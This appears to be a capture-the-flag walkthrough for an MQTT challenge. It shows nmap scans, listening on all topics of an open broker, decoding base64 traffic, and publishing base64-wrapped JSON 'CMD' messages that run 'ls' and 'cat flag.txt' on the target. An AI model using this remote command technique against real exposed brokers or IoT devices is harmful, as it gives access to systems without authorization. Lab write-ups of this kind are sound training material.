## ENUMERATION
Standard start ‚Äî quick port sweep:

```bash
nmap -p- --min-rate 2000 -vv -T4 <IP>
````

Found ports: `22`, `1883`. Focused scan:

```bash
nmap -p 22,1883 -sC -sV -vv -oN scan.nmap <IP>
```

## PORT 1883 ‚Äî MQTT basics (short)

If you haven‚Äôt dealt with MQTT before ‚Äî it‚Äôs simple:

* **Broker**: central server that routes messages.
* **Clients**: devices/apps that either **publish** (send) or **subscribe** (receive) to topics.
* Topics are hierarchical strings like `home/living/temperature`.
* Wildcards:

  * `#` subscribes to all topics at and below that level (everything).
  * `+` is single-level wildcard.

Install the tools:

```bash
sudo apt update
sudo apt install mosquitto mosquitto-clients -y
```

---

## SUBSCRIBE & LISTEN

Subscribe to everything to see traffic:

```bash
mosquitto_sub -h <IP> -p 1883 -t '#' -v
```

* `-t '#'` = subscribe to all topics
* `-v` verbose

Screenshot of listening:
![mosquitto\_sub](screenshots/mosquitto_sub.png)

You‚Äôll get messages like `topic payload`. One payload looked like base64. Decode it:

```bash
echo 'BASE64STRING' | base64 -d
```

Decoded payloads revealed a client ID and two topics:

* publisher: `U4vy....CHg/pub`
* subscriber: `XD2r....g0E/sub`

Looks like the service publishes on `U4vy.../pub` and reads commands on `XD2.../sub`.

---

## TALKING TO THE BROKER (PUBLISH)

We can publish to the `.../sub` topic to make the service respond on `.../pub`.

Example test message (raw):

```bash
mosquitto_pub -h <IP> -p 1883 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '{HELP}'
```     
![publish](screenshots/mosquitto_pub.png)    
If the service expects base64 or another wrapper, adjust accordingly. In my run, after decoding flows I learned the expected formats were something like ``base64({"id":"<id>", "cmd":"HELP, SYS or CMD", "arg":"<arg>"})``

After sending the correctly structured message (the challenge used base64-wrapped payloads in messages), I got this helpful reply:
![HELP](screenshots/HELP.png)

Decoded it (example):

```bash
# If payload was base64
echo 'RECEIVED_BASE64' | base64 -d
```

## GETTING THE FLAG

I sent a `CMD` to run `ls` and then `cat flag.txt`. Example:
```bash
echo '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"ls"}' | base64
```
```bash
mosquitto_pub -h <IP> -p 1883 -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' -m '<base64>'
```   

Response (base64 or raw) arrives on the `.../pub` topic. Decode and enjoy the flag:

## TL;DR (again, cause we love that)

Subscribe to `#`, decode base64 messages ‚Üí figure the publish/sub topics ‚Üí craft the correct `{CMD}` message ‚Üí publish it ‚Üí decode the response on the pub topic ‚Üí flag. Simple IoT vibes, big results.

## Notes, corrections & tips

* MQTT default port is **1883** (unencrypted); authenticated/secure brokers may use TLS/8883.
* You may encounter base64 wrapping, JSON, or custom framing ‚Äî always inspect decoded payloads carefully.
* If you get weird characters after base64 decode, try trimming non-base64 chars or re-check the exact payload (some services add noise).
* If the service requires a particular client ID or QoS, `mosquitto_pub` supports `-i <clientid>` and `-q <qos>`.
